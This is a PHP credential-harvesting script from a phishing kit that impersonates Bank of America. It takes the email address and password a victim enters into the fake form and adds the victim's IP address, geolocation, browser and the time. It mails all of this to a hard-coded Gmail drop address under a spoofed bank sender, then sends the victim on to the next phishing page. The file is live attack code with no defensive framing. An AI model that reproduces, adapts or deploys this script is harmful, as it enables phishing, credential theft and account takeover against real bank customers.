<?
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g:i a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);

$praga=rand();
$praga=md5($praga);

$message .= "--------------Bank of America Email-----------------------\n";
$message .= "Email: ".$_POST['formtext1']."\n";
$message .= "Email PassWord: ".$_POST['formtext2']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "---------------Created BY unknown-------------\n";
$send = "donaldbarnard0049459@gmail.com";
$subject = "Email & Pass from $ip";
$headers = "From: BANK OF AMERICA<customer-support@mrs>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);	
mail($to,$subject,$message,$headers);
}

	
		   header("Location: eml2.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");

	 
?>